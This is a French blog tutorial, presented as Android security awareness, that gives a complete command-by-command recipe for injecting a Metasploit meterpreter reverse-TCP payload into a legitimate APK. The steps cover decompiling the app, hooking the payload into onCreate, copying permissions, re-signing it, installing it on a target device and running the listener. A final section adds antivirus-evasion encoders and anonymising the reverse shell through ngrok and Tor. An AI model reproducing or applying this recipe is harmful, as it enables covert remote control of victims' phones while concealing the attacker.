# Comprendre les failles de certains APKs Android (Payload injection avec Metasploit)

- Canonical URL: https://leandeep.com/comprendre-les-failles-de-certains-apks-android-payload-injection-avec-metasploit/
- Author: Olivier Eeckhoutte
- Published: 2020-11-13T16:49:00+02:00
- Updated: 2020-11-13T16:49:00+02:00
- Language: fr
- Tags: kali, android, Security, metasploit, apk
- License: CC BY-NC 4.0 (https://creativecommons.org/licenses/by-nc/4.0/)


## Introduction

L'objectif de cet article est de sensibiliser à la sécurité sur Android. Ce n'est pas très compliqué d'injecter des virus (très) néfastes dans des APKs disponibles sur internet. Surtout n'installez pas des APKs qui ne proviennent pas des Stores Officiels d'Apple ou Google sans savoir ce que vous faites.

<br/>

## Installation sur Kali

**apktool**

```
mkdir ~/Dev/Android
cd $_
wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.4.1.jar
mv apktool_*.jar apktool.jar
wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
mv * /usr/local/bin
chmod +x /usr/local/bin/apktool.jar
chmod +x /usr/local/bin/apktool
```

<br/>

**zipalign**

```
apt install zipalign
```

<br/>

**jarsigner**

```
apt install openjdk-14-jdk-headless
```

<br/>

## Génération et injection du Payload et signature de l'APK

**Download apk de test**

Rendez-vous sur https://www.apkmirror.com/ et télécharger un APK.

<br/>

**Création payload**

Récupérer l'IP de la machine qui exploitera la vulnérabilité
ifconfig

Configurer et générer le payload qui sera injecté dans l'APK

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.17 LPORT=443 M> ~/Dev/Android/payload.apk
```

> Vocabulaire Metasploit:
> * LHOST: IP de l’attaquant
> * LPORT: Port utilisé
> * RHOST: IP de la victime
> * RPORT: Port de la victime

<br/>

**Desassembler les APKs**

```
apktool d payload.apk
apktool d mon_apk_avec_virus.apk
```

<br/>

**Ajouter le payload à l'APK**

```
cp -R payload/smali/com/metasploit mon_apk_avec_virus/smali/com/
```

<br/>

**Ajouter la commande permettant de lancer le payload lors de l'appel à la fonction `onCreate`**

En d'autres termes, injecter le main activity du payload dans l'APK après l'appel du onCreate.

Ligne suivante à ajouter dans le fichier `mon_apk_avec_virus/smali/com/company_name/mon_apk_avec_virus/SplashScreen.smali`
```
invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V
```

<br/>

**Ajouter les permissions à l'APK virus**

Copier toutes les permissions identifiées par les lignes XML `<uses-permission...` du fichier `payload/AndroidManifest.xml` dans `mon_apk_avec_virus/AndroidManifest.xml`.

<br/>

**Générer son propre certificat**

```
keytool -genkey -V -keystore /root/Dev/Android/key.keystore -alias education_purpose -keyalg RSA -keysize 2048 -validity 1000
```

<br/>

**Signer son nouveau APK**

```
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore /root/Dev/Android/key.keystore ./mon_apk_avec_virus_signed.apk education_purpose
```

<br/>

**Zipalign**

```
zipalign -v 4 ./mon_apk_avec_virus_signed.apk mon_apk_avec_virus.apk
```

<br/>

## Installation sur device cible

> Vérifier comment installer un apk sans qu'Android soit en mode developer.

```
adb devices
adb install -r mon_apk_avec_virus.apk
```

<br/>

## Exploitation

```
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lport 443
set lhost 192.168.0.17
exploit
help
```

Testez par vous-même pour découvrir le fonctionnement de ces techniques et donc pour mieux vous protéger mais n'utilisez pas cette technique pour pirater autrui.

<br/>

## Aller plus loin

- Utiliser un encoder afin que les antivirus ne détectent pas ces payloads

- Utiliser un reverse shell anonyme avec Ngrok et connect-back.

Utiliser par exemple les commandes suivantes: 

`./ngrok tcp 9999`.

*Forwarding tcp://0.tcp.ngrok.io:11811 -> localhost:9999*

Puis `LHOST=0.tcp.ngrok.io` et `LPORT=11811` dans la commande `msfvenom` précédente.

Et enfin `set LHOST 0.0.0.0` et `set LPORT 9999` dans meterpreter listener.

- Utiliser un reverse shell anonyme avec Ngrok et connect-back avec Tor entre les deux (ie: `socks5_proxy: "socks5://127.0.0.1:9050"` dans `ngrok.yml`)
